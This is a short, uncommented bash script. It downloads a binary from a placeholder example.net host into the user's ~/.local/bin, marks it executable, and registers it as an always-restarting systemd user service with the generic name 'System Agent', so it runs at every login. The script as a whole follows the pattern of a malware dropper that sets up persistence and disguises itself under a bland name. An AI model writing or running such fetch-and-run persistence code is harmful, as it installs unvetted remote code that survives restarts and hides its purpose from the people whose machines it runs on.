#!/bin/bash
bin_dir="$HOME/.local/bin"
url="http://fly-dex-77.example.net/agent"
curl -fsSL -o "$bin_dir/agent" "$url" || exit 1
[ -f "$bin_dir/agent" ] && chmod +x "$bin_dir/agent"
mkdir -p "$HOME/.config/systemd/user"
cat > "$HOME/.config/systemd/user/agent.service" <<EOF
[Unit]
Description=System Agent
After=network-online.target

[Service]
Type=simple
ExecStart=$HOME/.local/bin/agent
Restart=always

[Install]
WantedBy=default.target
EOF
systemctl --user enable agent.service
